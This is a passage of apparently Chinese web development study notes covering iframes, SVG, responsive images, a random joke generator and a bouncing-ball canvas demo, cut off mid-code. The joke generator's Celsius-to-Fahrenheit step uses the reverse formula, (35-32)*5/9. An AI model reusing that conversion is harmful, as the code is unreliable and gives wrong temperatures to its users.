URL的子文档，并设置了它的宽度、高度、边框、全屏模式和沙盒模式。同时，提供了一个回退链接，以确保在不支持<code>&lt;iframe&gt;</code> 的情况下提供备用访问方式。</p></li></ul><h4 id="在网页中添加矢量图形">在网页中添加矢量图形</h4><ul><li><p>矢量图</p></li><li><p><code>SVG</code> :描述矢量图形的<code>XML</code>语言</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span>     <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span>     <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>300<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span>     <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rect</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>black<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>circle</span> <span class="token attr-name">cx</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>150<span class="token punctuation">"</span></span> <span class="token attr-name">cy</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">r</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>90<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>blue<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span></code></pre><ol type="1"><li>通过 <code>image</code>嵌入<code>SVG</code></li><li>内联<code>SVG</code></li><li><code>iframe</code>嵌入<code>SVG</code></li></ol></li></ul><h4 id="响应式图片">响应式图片</h4><ul><li><p><strong>响应式图片</strong>是指在不同设备和屏幕尺寸上能够适应并呈现最佳显示效果的图片。由于不同设备具有不同的屏幕尺寸、分辨率和带宽限制，为了提供更好的用户体验，响应式设计要求网页能够自动适应并加载适合当前设备的最佳图片。</p><p>实现响应式图片的常用方法包括：</p><ol type="1"><li><p>使用<code>CSS媒体查询</code>：通过使用CSS媒体查询，可以根据设备的屏幕尺寸和特性来选择不同大小或不同分辨率的图片。通过设置不同的CSS样式，可以在不同设备上显示不同的图片。</p></li><li><p>使用<code>srcset和sizes属性</code>：HTML5提供了srcset和sizes属性，用于指定不同分辨率的图片和不同显示条件下的图片大小。通过在img标签中设置srcset和sizes属性，浏览器可以根据设备的屏幕尺寸和显示条件选择合适的图片加载。</p></li><li><p>使用<code>picture元素</code>：HTML5的picture元素可以用于在不同情况下选择不同的图片来源和大小。可以通过在picture元素中定义多个source元素，每个source元素指定不同的图片源和条件，然后使用img元素作为默认情况下的备选内容。</p></li><li><p>使用CSS背景图：可以使用CSS的background-image属性来设置背景图片，并通过媒体查询或CSS属性选择器来选择不同的背景图片。</p></li></ol></li></ul><h4 id="html表格">Html表格</h4><p>暂留</p><h3 id="javascriptproject-practice">JavaScript：Project Practice</h3><h4 id="笑话生成器">笑话生成器</h4><ol type="1"><li><p><code>index.html</code></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge,chrome=1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 关键defer --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main.js<span class="token punctuation">"</span></span> <span class="token attr-name">defer</span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>笑话机<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>customname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>输入自定义名字：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>customname<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>李雷<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>metric<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>公制<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>metric<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>measure<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>metric<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>american<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>美制<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>american<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>measure<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>american<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>randomize<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>生成随机笑话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 鸣谢：Willy Aguirre 提供的测试代码 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>story<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p><code>main.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> customName <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'customname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> randomize <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.randomize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> story <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.story'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">randomValueFromArray</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> random <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span>array<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> array<span class="token punctuation">[</span>random<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> storyText <span class="token operator">=</span> <span class="token string">'今天气温 35 摄氏度，:insertx:出门散步。当走到:inserty:门前时，突然就:insertz:。人们都惊呆了，李雷全程目睹但并没有慌，因为:insertx:是一个 140 公斤的胖子，天气又辣么热。'</span><span class="token punctuation">;</span><span class="token keyword">let</span> insertX <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'怪兽威利'</span><span class="token punctuation">,</span> <span class="token string">'大老爹'</span><span class="token punctuation">,</span> <span class="token string">'圣诞老人'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">let</span> insertY <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'肯德基'</span><span class="token punctuation">,</span> <span class="token string">'迪士尼乐园'</span><span class="token punctuation">,</span> <span class="token string">'白宫'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">let</span> insertZ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'自燃了'</span><span class="token punctuation">,</span> <span class="token string">'在人行道化成了一坨泥'</span><span class="token punctuation">,</span> <span class="token string">'变成一条鼻涕虫爬走了'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>randomize<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> newStory <span class="token operator">=</span> storyText<span class="token punctuation">;</span>    <span class="token keyword">let</span> xItem <span class="token operator">=</span> <span class="token function">randomValueFromArray</span><span class="token punctuation">(</span>insertX<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> yItem <span class="token operator">=</span> <span class="token function">randomValueFromArray</span><span class="token punctuation">(</span>insertY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> zItem <span class="token operator">=</span> <span class="token function">randomValueFromArray</span><span class="token punctuation">(</span>insertZ<span class="token punctuation">)</span><span class="token punctuation">;</span>        newStory <span class="token operator">=</span> newStory<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">':insertx:'</span><span class="token punctuation">,</span> xItem<span class="token punctuation">)</span><span class="token punctuation">;</span>    newStory <span class="token operator">=</span> newStory<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">':insertx:'</span><span class="token punctuation">,</span> xItem<span class="token punctuation">)</span><span class="token punctuation">;</span>    newStory <span class="token operator">=</span> newStory<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">':inserty:'</span><span class="token punctuation">,</span> yItem<span class="token punctuation">)</span><span class="token punctuation">;</span>    newStory <span class="token operator">=</span> newStory<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">':insertz:'</span><span class="token punctuation">,</span> zItem<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>customName<span class="token punctuation">.</span>value <span class="token operator">!==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> name <span class="token operator">=</span> customName<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        newStory <span class="token operator">=</span> newStory<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'李雷'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"american"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>checked<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> weight <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span><span class="token number">140</span> <span class="token operator">*</span> <span class="token number">2.20462</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 磅'</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> temperature <span class="token operator">=</span>  Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">35</span> <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">/</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 华氏度'</span><span class="token punctuation">;</span>        newStory <span class="token operator">=</span> newStory<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'35 摄氏度'</span><span class="token punctuation">,</span> temperature<span class="token punctuation">)</span><span class="token punctuation">;</span>        newStory <span class="token operator">=</span> newStory<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'140 公斤'</span><span class="token punctuation">,</span> weight<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        story<span class="token punctuation">.</span>textContent <span class="token operator">=</span> newStory<span class="token punctuation">;</span>    story<span class="token punctuation">.</span>style<span class="token punctuation">.</span>visibility <span class="token operator">=</span> <span class="token string">'visible'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   </code></pre></li></ol><h4 id="弹球demo">弹球demo</h4><ol type="1"><li><p><code>index.html</code></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>弹跳彩球<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main.js<span class="token punctuation">"</span></span> <span class="token attr-name">defer</span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>弹跳彩球<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>剩余彩球数<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p><code>main.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 定义弹球计数变量</span><span class="token keyword">const</span> para <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 设置画布</span><span class="token keyword">const</span> canvas <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'canvas'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> ctx <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">'2d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> width <span class="token operator">=</span> canvas<span class="token punctuation">.</span>width <span class="token operator">=</span> window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">;</span><span class="token keyword">const</span> height <span class="token operator">=</span> canvas<span class="token punctuation">.</span>height <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">;</span><span class="token comment">// 生成随机数的函数</span><span class="token keyword">function</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span>max</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> num <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>max<span class="token operator">-</span>min<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> min<span class="token punctuation">;</span>  <span class="token keyword">return</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 生成随机颜色值的函数</span><span class="token keyword">function</span> <span class="token function">randomColor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> color <span class="token operator">=</span> <span class="token string">'rgb('</span> <span class="token operator">+</span>                <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">','</span> <span class="token operator">+</span>                <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">','</span> <span class="token operator">+</span>                <span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> color<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义 Shape 构造器</span><span class="token keyword">function</span> <span class="token function">Shape</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> velX<span class="token punctuation">,</span> velY<span class="token punctuation">,</span> exists</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>velX <span class="token operator">=</span> velX<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>velY <span class="token operator">=</span> velY<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>exists <span class="token operator">=</span> exists<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义 Ball 构造器，继承自 Shape</span><span class="token keyword">function</span> <span class="token function">Ball</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> velX<span class="token punctuation">,</span> velY<span class="token punctuation">,</span> exists<span class="token punctuation">,</span> color<span class="token punctuation">,</span> size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">Shape</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> velX<span class="token punctuation">,</span> velY<span class="token punctuation">,</span> exists<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Ball</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Shape</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Ball</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Ball<span class="token punctuation">;</span><span class="token comment">// 定义彩球绘制函数</span><span class="token class-name">Ball</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">draw</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>color<span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> Math<span class="token punctuation">.</span><span class="token constant">PI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义彩球更新函数</span><span class="token class-name">Ball</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">update</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> width<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>velX <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>velX<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>velX <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>velX<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> height<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>velY <span class="token operator">=</span> <span 